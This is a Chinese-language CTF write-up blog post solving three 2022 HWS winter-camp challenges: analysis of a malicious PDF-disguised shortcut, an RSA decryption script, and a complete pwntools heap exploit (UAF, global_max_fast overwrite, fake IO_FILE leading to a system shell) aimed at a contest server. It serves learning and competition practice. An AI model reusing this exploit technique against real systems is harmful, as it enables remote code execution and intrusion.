---
layout: post
title: "2022HWS冬令营 wp"
date:   2022-1-29
tags: [ctf_wp]
comments: true
author: wsxk
---

- [1. BadPDF](#1-badpdf)
- [2. babyrsa](#2-babyrsa)
- [3. 送分题](#3-送分题)

<!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-C22S5YSYL7"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-C22S5YSYL7');
</script>


## 1. BadPDF<br> 
其实是一道misc题目（但是好玩就玩了下

![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2022-1-29-2022HWSwinter_BadPDF/1.png)

打开看了一下发现是个ink文件（快捷方式文件）

打开文件后，发现了有趣的东西（记事本打开）
![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2022-1-29-2022HWSwinter_BadPDF/2.png)

这段快捷方式其实运行的是某段代码。提取后如下（记事本就可以提取，再根据bat文件的语法分行即可）

![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2022-1-29-2022HWSwinter_BadPDF/3.png)


接下来照着这个代码自己运行一次
然后依次点开每个文件看看是什么东西。
主要注意的是expand.exe指令 这是windows中的解压缩包指令。
所以
oGhPGUDC03tURV.tmp文件是个压缩包。

用7z解压得到
![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2022-1-29-2022HWSwinter_BadPDF/4.png)

其中 20200308开头的文件就是我们浏览到的pdf文件。
9s开头的是js脚本，其实就是我们执行的那个命令

cS开头的就是重头戏：应该跟flag有关
同样用记事本打开
![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2022-1-29-2022HWSwinter_BadPDF/5.png)

可以看到，主要执行代码是VBS程序，重点是对那串字符串每两个组成一个字符，然后异或1

![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2022-1-29-2022HWSwinter_BadPDF/6.png)

这样，我们就得到了flag<br>

## 2. babyrsa<br>
一道关于rsa的简单题目。

其实这道题目是比较简单的，只不过一开始看的时候看错了
所以直接寄了

先看源代码

![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2022-1-31-2022HWSwinter_babyrsa/1.png)

可以看到它把 N e c告诉了我们
![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2022-1-31-2022HWSwinter_babyrsa/2.png)

这道题目有一个坑点是N e其实是连在一起的，中间是用空格来隔开的。

可以用factordb来分解n

![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2022-1-31-2022HWSwinter_babyrsa/3.png)

现在知道p q e c，可以求d和m了

    import imp
    import gmpy2
    from Crypto.Util.number import bytes_to_long, long_to_bytes
    n = 13123058934861171416713230498081453101147538789122070079961388806126697916963123413431108069961369055630747412550900239402710827847917960870358653962948282381351741121884528399369764530446509936240262290248305226552117100584726616255292963971141510518678552679033220315246377746270515853987903184512948801397452104554589803725619076066339968999308910127885089547678968793196148780382182445270838659078189316664538631875879022325427220682805580410213245364855569367702919157881367085677283124732874621569379901272662162025780608669577546548333274766058755786449491277002349918598971841605936268030140638579388226573929
    e = 2199344405076718723439776106818391416986774637417452818162477025957976213477191723664184407417234793814926418366905751689789699138123658292718951547073938244835923378103264574262319868072792187129755570696127796856136279813658923777933069924139862221947627969330450735758091555899551587605175567882253565613163972396640663959048311077691045791516671857020379334217141651855658795614761069687029140601439597978203375244243343052687488606544856116827681065414187957956049947143017305483200122033343857370223678236469887421261592930549136708160041001438350227594265714800753072939126464647703962260358930477570798420877
    p = 98197216341757567488149177586991336976901080454854408243068885480633972200382596026756300968618883148721598031574296054706280190113587145906781375704611841087782526897314537785060868780928063942914187241017272444601926795083433477673935377466676026146695321415853502288291409333200661670651818749836420808033
    q = 133639826298015917901017908376475546339925646165363264658181838203059432536492968144231040597990919971381628901127402671873954769629458944972912180415794436700950304720548263026421362847590283353425105178540468631051824814390421486132775876582962969734956410033443729557703719598998956317920674659744121941513
    c = 1492164290534197296766878830710549288168716657792979479408332026408553210558539364503279432780006256047888761718878241924947937039103166564146378209168719163067531460700424309878383312837345239570897122826051628153030129647363574035072755426112229160684859510640271933580581310029921376842631120847546030843821787623965614564745724229763999106839802052036834811357341644073138100679508864747009014415530176077648226083725813290110828240582884113726976794751006967153951269748482024859714451264220728184903144004573228365893961477199925864862018084224563883101101842275596219857205470076943493098825250412323522013524

    phi = (p-1)*(q-1)
    d = gmpy2.invert(e, phi)
    m = gmpy2.powmod(c, d, n)

    print(long_to_bytes(m))

![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2022-1-31-2022HWSwinter_babyrsa/4.png)<br>


## 3. 送分题<br>

这道题是原题

首先利用uaf漏洞以及large chunk，修改fastbin的大小（改成很大
然后覆盖IO_file


    from pwn import *
    from LibcSearcher import *

    #io=remote('47.96.90.40',12345)
    #io=process('./pwn')
    #ld_path = "/home/wsxk/Desktop/glibc/glibc-2.27/64/lib/ld-2.27.so"
    #libc_path = "/home/wsxk/Desktop/ctf/libc-2.27.so"
    #libc_path = "/home/wsxk/Desktop/glibc/glibc-2.27/64/lib/libc-2.27.so"
    #io = process([ld_path, "./pwn"], env={"LD_PRELOAD":libc_path})
    io = remote('1.13.162.249',10001)
    elf = ELF('./pwn')
    libc = ELF('libc-2.27.so')
    context.log_level = 'debug'

    io.recvuntil('Now you can get a big box, what size?\n')
    io.sendline(str(0x1450-0x20))
    io.recvuntil("Now you can get a bigger box, what size?\n")
    io.sendline(str(20480))
    io.recvuntil("Do you want to rename?(y/n)\n")
    io.sendline('y')
    #gdb.attach(io)

    io.recvuntil('Now your name is:')
    main_arean = u64(io.recv(6).ljust(8,b'\x00'))#-96
    libc_base = main_arean -96-0x3EBC40
    print('main_arena:'+hex(main_arean))
    print('libc_base:'+hex(libc_base))
    io.sendline(p64(main_arean)+p64(main_arean+0x1ca0-0x10))#max_fast

    target_addr = libc_base + libc.symbols['_IO_list_all']
    io.recvuntil("Do you want to edit big box or bigger box?(1:big/2:bigger)\n")
    io.sendline('1')
    io.recvuntil("Let's edit, ")
    bin_bash = libc_base + 0x1b40fa
    io_str_jumps = libc_base + 0x3e8360

    #gdb.attach(io)
    fake_io_file = p64(0)*2
    fake_io_file += p64(0)+p64(bin_bash+1)
    fake_io_file += p64(0)*2
    fake_io_file += p64((bin_bash-100)//2)+p64(0)
    fake_io_file = fake_io_file.ljust(0xb0,b'\x00')
    fake_io_file += p64(0xFFFFFFFFFFFFFFFF) + p64(0)*2
    fake_io_file += p64(io_str_jumps)
    fake_io_file += p64(libc_base+libc.symbols['system'])
    io.sendline(fake_io_file)

    io.recvuntil('bye')
    io.interactive()
